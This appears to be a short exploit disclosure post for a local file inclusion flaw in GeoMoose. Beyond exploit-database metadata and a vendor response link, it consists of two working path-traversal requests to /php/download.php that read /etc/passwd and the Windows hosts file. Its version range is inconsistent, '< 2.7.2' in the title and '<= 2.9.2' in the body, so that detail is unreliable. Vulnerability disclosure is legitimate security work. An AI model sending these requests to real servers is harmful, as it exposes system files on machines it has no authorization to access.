Title: GeoMoose < 2.7.2 LFI
Author: Sander
Date: 2017-03-04 01:29
Slug: geomoose-lfi
Category: exploit
Tags: cve
Summary: vulnerability for GeoMoose


```text
# Exploit Title: GeoMoose <= 2.9.2 Local File Inclusion
# Exploit Author: Sander
# Date: 2017-03-4
# Version: <= 2.9.2
# Vendor Homepage: geomoose.org
# Reported: 4-3-2017
# Vendor response: http://osgeo-org.1560.x6.nabble.com/Geomoose-users-GeoMoose-Security-Issue-td5315873.html
# Software Link: https://github.com/geomoose/geomoose
# Tested on: Windows/Linux
# CVE : none

/php/download.php?id=foo/.&ext=/../../../../../../../etc/passwd
/php/download.php?id=foo/.&ext=/../../../../../../../WINDOWS/system32/drivers/etc/hosts
```
